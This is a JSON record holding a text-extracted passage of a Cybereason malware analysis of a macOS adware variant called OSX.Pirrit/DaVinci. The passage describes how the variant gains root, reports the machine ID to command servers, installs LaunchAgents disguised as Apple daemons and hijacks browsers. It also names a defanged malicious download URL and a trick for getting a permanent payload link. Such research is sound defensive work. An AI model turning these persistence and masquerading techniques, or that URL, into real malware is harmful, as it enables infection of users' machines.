{
    "id": "df227328-7636-4d48-9e4f-61fe6d4697e4",
    "created_at": "2022-10-25T16:48:14.061672Z",
    "updated_at": "2025-03-27T02:13:12.17585Z",
    "deleted_at": null,
    "sha1_hash": "2a2ac961ca40929099c49b5a1aa82769486feafe",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-12-08T14:19:30Z",
    "file_modification_date": "2017-12-12T11:06:19Z",
    "file_size": 4933923,
    "plain_text": "### OSX PIRRIT: PART III\n\n##### The DaVinci Code\n\n# PIRRIT\n\n\n### OSX PIRRIT: PART III\n\n##### The DaVinci Code\n\n# PIRRIT\n\n\n-----\n\nIn April 2016, I published a [research](http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf) report that analyzed a very nasty piece of adware that\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ntargets Mac OS X. Called OSX.Pirrit, I discovered that it wasn’t your typical adware program\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthat just floods a person’s browser with ads. With components such as persistence and the\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nability to obtain root access, OSX.Pirrit has characteristics usually seen in malware. While\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nOSX.Pirrit’s main goal was to display ads, the way it did this contains many practices borrowed\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nfrom traditional malware. Ultimately, OSX.Pirrit’s code had the potential to carry out much more\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nmalicious activities. As a result of the report, some of Pirrit’s servers and a few distribution\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwebsites were taken down.\n​ ​ ​ ​ ​ ​\n\nBut the story doesn’t end there. A few months later, I learned that a new variant of OSX.Pirrit\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwas in the wild. After investigating it, I discovered that a company called TargetingEdge created\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nOSX.Pirrit and, in July, wrote [a](https://www2.cybereason.com/research-osx-pirrit-mac-adware) report discussing how I figured this out. And once again, some\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nPirrit’s servers and distribution websites were taken offline.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nNow it’s time for chapter three. Curious to see if OSX.Pirrit was still alive and spreading, I\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nrecently started researching it again. And, to my surprise, it’s very active. Not only is it still\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ninfecting people’s Macs, OSX.Pirrit’s authors learned from one of their mistakes (They obviously\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nread at least one of our earlier reports).\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nUnlike old versions of OSX.Pirrit that used rogue browser plug-ins or even installed a proxy\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nserver on the victim’s machine to hijack the browser, this incarnation uses (or shall I say\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nabuses) AppleScript, Apple's scripting/automation language. And, like its predecessors, this\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nvariant is nasty. In addition to bombarding people with ads, it spys on them and runs under root\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nprivileges.\n\nMy research hasn’t gone unnoticed by TargetingEdge. For the past two weeks they've tried to\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nprevent me from publishing this research. Cybereason has received a few cease and desist\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nletters from a firm claiming to be TargetingEdge’s legal counsel. The letters demand that we\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nstop referring to TargetingEdge's software as malware and refrain from publishing this report.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nIncluded below is the official response TargetingEdge requested that we include in our report:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n1\n\n\n-----\n\nCybereason isn’t the only security company that identifies OSX.Pirrit as a threat. Twenty-eight\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nother antivirus engines on Virus Total also classify it as such. The authors of this software went\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthrough great lengths to mask themselves and distance themselves from it.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nAs for why I'm still researching this program, constantly track threats, whether it’s sophisticated\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nnation state APTs or “benign adware\" is how the security community learns about the latest\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthreats and how to stop them.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nAs the letter shows, TargetingEdge is trying its best to deny any link to OSX.Pirrit. However, in\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nJanuary 2017, a former employee, whose name was one of the two found in the dropped files\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nthat led us to TargetingEdge, sent Cybereason his resumé where he clearly establishes a\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nconnection between TargetingEdge and OSX.Pirrit.\n​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n2\n\n\n-----\n\n**Starting** **the** **research:**\n​ ​ ​ ​\n\nEvery time I stumble across an interesting malware sample I write YARA rules for it. These rules\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nallow me to find new variants once they’re released.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nJust before I wrote this report, one of my OSX.Pirrit-related YARA rules started returning\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthousands of results, indicating a wave of new infections. After downloading and analyzing\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nsome of the samples, I identified OSX.Pirrit straight away and noticed that many of its methods\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nchanged. This report analyzes this latest variant.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n**An** **Important** **note** **before** **I** **discuss** **my** **research:** In this report, the term _installer_ refers to\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​​ ​ ​ ​\nTargetingEdge’s main product - an installer that installs software like a video player or a PDF\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nreader that’s downloaded from a site. These installers will install the downloaded software and\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nand the additional malware.\n​ ​ ​ ​ ​ ​\n\nAll of the installers that are downloading and executing these scripts are running as root since\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthe first thing that do after execution is to ask for the user’s password. This is a key point since it\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nexplains how everything in the process described in this report is running with root permission.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n3\n\n\n-----\n\nSince users are, by default, in the sudoers list, getting the user’s password equals getting the\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nuser’s root password. For more details, read [this](http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf) report or watch my talk from [LayerOne](https://youtu.be/CHiYT7vU9Fk) 2016.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nI started my research by looking at some telemetry data from the infected Macs and other threat\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nintel providers. After acquiring enough samples of Mac software installers (for more information\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\non the installers, read this report [on](http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf) OSX.Pirrit), I wrote some code that executes the installers\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nand looks at all of the outgoing connections that the installer creates. After doing that, I learned\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthat the installers are are generating HTTP requests to a specific URL, but that URL is actually a\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\none-time link that contains the ID of that specific install as an HTTP parameter, so every link\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nonly works once.\n​ ​ ​ ​\n\nI then decided to mess with the URL to see if I can get one URL that will always work. To my\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nsurprise, it was actually simpler than I thought. By using a quote (“) as the id parameter and\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nsending that request to the server, the server will return a URL with a link that always work:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nAnd now when I request that URL, the server will return the installation script back to me:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n4\n\n\n-----\n\nAnother interesting thing to note is the “us” field in the request. Setting it to True delivers a\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ndifferent installation script that points to a different server. My guess is the “us” parameter\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nstands for “United States” and it points to a different ad server. You can clearly see this in a\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nscreenshot comparing the two files:\n​ ​ ​ ​ ​ ​ ​ ​\n\nA bash script with 329 lines is downloaded. This is very similar to the scripts I saw last year\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwhen I analyzed OSX.Pirrit and it is very safe to say that both this script and last year’s script\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwere written by the same group or even person. This script has several functions, some with\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nnames that are very descriptive, others with names that don’t say much. The script also contains\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nmany domains and URLs, which help us understand how vast TargetingEdge’s infrastructure is.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nThe​ 329​ ​ line​ ​ long​ ​ script​ ​ starts​ ​ by​ ​ defining​ ​ a​ ​ function​ ​ called​ ​ _rnd()​_ .​ ​ The​ ​ purpose​ ​ of​ ​ this​ ​ function ​\nis to generate and return one random word by accessing the dictionary wordlist file (provided by\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthe​ operating​ ​ system​ ​ in​ ​ /usr/share/dict/words​ )​ ​ and​ ​ picking​ ​ one​ ​ random​ ​ word: ​\n\nThe​ names​ ​ that​ ​ are​ ​ generated​ ​ are​ ​ used​ ​ to​ ​ create​ ​ a​ ​ random​ ​ directory​ ​ in​ ​ ~/Library/<random ​\nname>,​ ​ which​ ​ will​ ​ contain​ ​ the​ ​ dropped​ ​ application.​ ​ In​ ​ this​ ​ case,​ ​ it’s​ ​ the​ ​ browser​ ​ hijacker. ​\n\nThe​ script​ ​ then​ ​ extracts​ ​ the​ ​ UUID​ ​ of​ ​ the​ ​ machine,​ ​ saves​ ​ it​ ​ to​ ​ a​ ​ variable​ ​ called​ ​ _$mid​_ ​ and​ ​ sends​ ​ it ​\nback to one of TargetingEdge’s many command-and-control (C&C) servers by issuing a simple\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n_curl_ command:\n​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n5\n\n\n-----\n\nThe script also sends other data back to the C&C server, such as the generated app name, its\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\npath and its version.\n​ ​ ​ ​ ​ ​\n\nThe script will then download a component of the malware called “updater” from yet another\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nserver.\n\nThe variable in the address points to\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nhttp://t[.]46sdzf3zdg1dxg2[.]us/download/hjfgkdvuewree?uu=1\n\nThe downloaded file is a tar.gz archive. Next, it’s extracted.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nThe script will also create a launchagent in ~/Library/LaunchAgents/com.<RANDOM\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nNAME>.plist.\n\nThat launchagent will run “updater” **as** **root** once the script finishes running.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nThe next step is downloading the “updater” binary.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n**Analyzing** **_updater:_**\n​ ​ ​\n\nWhen​ analyzing​ ​ the​ ​ “​ _updater​_ ”​ ​ binary,​ ​ it​ ​ is​ ​ very​ ​ easy​ ​ to​ ​ understand​ ​ its​ ​ purpose​ ​ by​ ​ looking​ ​ at​ ​ it ​\nwith a disassembler (in this case I’m using Jonathan Levin’s _[jtool):](http://newosxbook.com/tools/jtool.html)_\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n\n6\n\n\n-----\n\nAs the names of the functions show, they are all infrastructure related: keeping the infrastructure\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nupdated, downloading files, installing new versions of the malware on the machine. But there is\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\none​ function​ ​ that​ ​ stands​ ​ out:​ ​ _[UpdaterCommunication​_ ​ _runExternalApplication]​_ ​.\n\nDisassembling it in IDA Pro clearly reveals this function’s purpose:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n​ The​ ​ function​ ​ executes​ ​ _/bin/sh​_ ​ with​ ​ _[NSTASK​](https://developer.apple.com/documentation/foundation/nstask)_ ​​ with​ ​ a​ ​ parameter​ ​ in​ ​ the​ ​ format​ ​ of​ ​ a​ ​ string. ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n7\n\n\n-----\n\nThe​ _updater​_ ​ file​ ​ is​ ​ the​ ​ only​ ​ file​ ​ that’s​ ​ codesigned.​ ​ However,​ ​ unlike​ ​ the​ ​ original​ ​ OSX.Pirrit,​ ​ it ​\nwas codesigned with an ad hoc signature instead of a normal certificate. Ad hoc signatures are\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nused to provision **iOS** applications in **test** **environments.** An ad hoc signed Mach-O executable\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nhas no meaning on macOS since the component that checks and validates ad hoc signatures,\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthe AMFI trust cache, does not exist in macOS. My guess is that if this binary wasn’t ad hoc\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nsigned by mistake, it was an attempt to fool antivirus programs.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nAs​ a​ ​ part​ ​ of​ ​ _updater​_ _’s​_ ​ work,​ ​ it​ ​ enumerates​ ​ running​ ​ processes​ ​ using​ ​ the​ ​ _[NSWorkspace​](https://developer.apple.com/documentation/appkit/nsworkspace)_ ​ class, ​\ncalls​ the​ ​ _[runningApplications​](https://developer.apple.com/documentation/appkit/nsworkspace/1534059-runningapplications)_ ​ function​ ​ and​ ​ then​ ​ iterates​ ​ over​ ​ the​ ​ output​ ​ to​ ​ see​ ​ if​ ​ either ​\nFirefox, Chrome or Safari are running. It then downloads “ad packages” for the browsers that\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nare installed on the system. _Updater_ always runs in the background (it’s also installed as a\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nLaunchAgent) and ensures that the ad packages are always up to date.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n**Installing** **_updater’s_** **LaunchAgent:**\n​ ​ ​ ​ ​\nThe​ dropped​ ​ _updater​_ ​ binary​ ​ will​ ​ now​ ​ be​ ​ moved​ ​ to​ ​ ~/Library/<random​ ​ name>/<random ​\nname>.​ ​ After​ ​ _updater​_ ​ has​ ​ been​ ​ renamed​ ​ and​ ​ moved​ ​ to​ ​ a​ ​ proper​ ​ directory,​ ​ the​ ​ script​ ​ will​ ​ finally ​\ncreate​ the​ ​ the​ ​ LaunchAgent​ ​ plist​ ​ file​ ​ in​ ​ ~/Library/LaunchAgents/com.<random ​\nname>.plist\n\nAs the following screenshot shows, the random word that was chosen when installed in my\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nanalysis setup was “roadless”. This means that the file was created in\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n~/Library/roadless/roadless​ and​ ​ the​ ​ LaunchAgent​ ​ name​ ​ was​ ​ _com.roadless.plist ​_\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n8\n\n\n-----\n\nAfter the updater LaunchDaemon was created, the script will now download a file called\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n_sr_v2.tgz​_ to​ ​ /var/tmp/sr.tgz​ .​ ​ It​ ​ will​ ​ then​ ​ be​ ​ extracted​ ​ to​ ​ _/var/tmp/dvs​_ .​ ​ This​ ​ file​ ​ contains ​\nthe malware that will hijack the browser.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nOnce extracted to its temporary directory, we can see a bunch of files and directories extracted.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nAmong​ these​ ​ files​ ​ are​ ​ two​ ​ executables​ ​ (​ _Protector​_ ​ and​ ​ _updater​_ _)​_ ​ and​ ​ various​ ​ installation​ ​ and ​\nsetup​ scripts​ ​ (​ _setup.sh​_ ​ and​ ​ ​install_updater.sh): ​\n\nThe​ program​ ​ will​ ​ now​ ​ execute​ ​ yet​ ​ another​ ​ setup​ ​ script,​ ​ called​ ​ _setup.sh​_ .​ ​ This​ ​ script​ ​ installs​ ​ the ​\nprogram’s next components. The authors left the program’s internal name in the setup script:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nDaVinci.\n\nIn the next step, the script again generates a list of names but doesn’t use the wordlist file on\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthe​ system.​ ​ Instead,​ ​ it​ ​ selects​ ​ a​ ​ word​ ​ from​ ​ the​ ​ _names.db​_ ​ file: ​\n\nImmora Nalen Quoroden Enthinge Kimathen Cheechran Ightquemos Dandan Morkim Ertur\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nEtiao Schiwarkin Vayt Crybur Ashsul Tiavorurn Dannalmos Saml Rek Sideb Therkkin Usktas\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nCereng Builing Nysgar Beldanash Roinnris Yenga Ightem Pertino Athechyer Sysir Nomaro\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nRilchin Yerrack Elmeld Riarat Tasard Miom Panur Milobe Rothl\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nAfter​ a​ ​ random​ ​ name​ ​ is​ ​ chosen​ ​ from​ ​ _names.db​_,​ ​ **another​** ​ LaunchAgent​ ​ for​ ​ DaVinci​ ​ is​ ​ created​ ​ in ​\n_/Library/LaunchDaemons/com.apple.<randomname>.plist​_ ​ -​ ​ As​ ​ clearly​ ​ shown, ​\nDaVinci is trying to mask itself as a legitimate Apple LaunchDaemon.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n9\n\n\n-----\n\n**DaVinci** **and** **browser** **add-ons:**\n​ ​ ​ ​ ​ ​\n\nIn previous versions of OSX.Pirrit and BrowserEnhancer, in some cases, the malware dropped\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nmalicious browser extensions to track the users and display ads. Since browser extensions are\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ 